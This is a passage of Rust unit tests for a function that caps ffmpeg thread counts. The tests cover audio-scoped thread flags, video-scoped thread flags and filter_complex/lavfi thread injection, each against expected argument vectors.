            adapted_other.contains(&"opencl=ocl_direct:0.0".to_string()),
            "non-render-node device must remain untouched: {adapted_other:?}"
        );
    }

    #[test]
    fn apply_ffmpeg_thread_cap_handles_audio_scoped_threads_and_filter_complex_threads() {
        // 1. Audio-only `-threads:a 2` MUST NOT suppress injecting output `-threads 4` for video encode,
        //    and `-threads:a 16` is still clamped to 4.
        let audio_scoped = apply_ffmpeg_thread_cap(
            &[
                "-i",
                "/srv/media/a.mkv",
                "-c:v",
                "libx264",
                "-c:a",
                "aac",
                "-threads:a",
                "2",
                "out.m3u8",
            ],
            4,
        );
        assert_eq!(
            audio_scoped,
            vec_s(&[
                "-threads",
                "4",
                "-i",
                "/srv/media/a.mkv",
                "-c:v",
                "libx264",
                "-threads",
                "4",
                "-c:a",
                "aac",
                "-threads:a",
                "2",
                "out.m3u8",
            ])
        );

        let audio_oversized = apply_ffmpeg_thread_cap(
            &[
                "-threads:a",
                "16",
                "-i",
                "/srv/media/a.mkv",
                "-c:v",
                "libx264",
                "-threads:a:0",
                "0",
                "out.m3u8",
            ],
            4,
        );
        assert_eq!(
            audio_oversized,
            vec_s(&[
                "-threads:a",
                "4",
                "-threads",
                "4",
                "-i",
                "/srv/media/a.mkv",
                "-c:v",
                "libx264",
                "-threads",
                "4",
                "-threads:a:0",
                "4",
                "out.m3u8",
            ])
        );

        // Video-scoped `-threads:v 2` DOES satisfy video output threads (no duplicate `-threads 4`).
        let video_scoped = apply_ffmpeg_thread_cap(
            &[
                "-threads:v:0",
                "2",
                "-i",
                "/srv/media/a.mkv",
                "-c:v",
                "libx264",
                "-threads:v",
                "2",
                "out.m3u8",
            ],
            4,
        );
        assert_eq!(
            video_scoped,
            vec_s(&[
                "-threads:v:0",
                "2",
                "-i",
                "/srv/media/a.mkv",
                "-c:v",
                "libx264",
                "-threads:v",
                "2",
                "out.m3u8",
            ])
        );

        // 2. `-filter_complex` and `-lavfi` without `-filter_complex_threads` inject `-filter_complex_threads <cap>`.
        let fc = apply_ffmpeg_thread_cap(
            &[
                "-i",
                "/srv/media/a.mkv",
                "-filter_complex",
                "[0:v]scale=1280:720[v]",
                "-map",
                "[v]",
                "-c:v",
                "libx264",
                "out.m3u8",
            ],
            4,
        );
        assert_eq!(
            fc,
            vec_s(&[
                "-threads",
                "4",
                "-i",
                "/srv/media/a.mkv",
                "-filter_complex_threads",
                "4",
                "-filter_complex",
                "[0:v]scale=1280:720[v]",
                "-map",
                "[v]",
                "-c:v",
                "libx264",
                "-threads",
                "4",
                "out.m3u8",
            ])
        );

        let lavfi = apply_ffmpeg_thread_cap(
            &[
                "-i",
                "/srv/media/a.mkv",
                "-lavfi",
                "[0:v]scale=1280:720[v]",
                "-map",
                "[v]",
                "-c:v",
                "libx264",
                "out.m3u8",
            ],
            4,
        );
        assert_eq!(
            lavfi,
            vec_s(&[
                "-threads",
                "4",
                "-i",
                "/srv/media/a.mkv",
                "-filter_complex_threads",
                "4",
                "-lavfi",
                "[0:v]scale=1280:720[v]",
                "-map",
                "[v]",
                "-c:v",
                "libx264",
                "-threads",
                "4",
                "out.m3u8",
            ])
        );

        // Explicit `-filter_complex_threads 2` is preserved without injecting a second flag.
        let fc_explicit = apply_ffmpeg_thread_cap(
            &[
                "-i",
                "/srv/media/a.mkv",
                "-filter_complex_threads",
                "2",
                "-filter_complex",
                "[0:v]scale=1280:720[v]",
                "-map",
                "[v]",
                "-c:v",
                "libx264",
                "out.m3u8",
            ],
            4,
        );
        assert_eq!(
            fc_explicit
                .iter()
                .filter(|a| *a == "-filter_complex_threads")
                .count(),
            1
        );
        assert_eq!(
            fc_explicit,
            vec_s(&[
                "-threads",
                "4",
                "-i",
                "/srv/media/a.mkv",
                "-filter_complex_threads",
                "2",
                "-filter_complex",
                "[0:v]scale=1280:720[v]",
                "-map",
                "[v]",
                "-c:v",
                "libx264",
                "-threads",
                "4",
                "out.m3u8",
            ])
        );
    }
}
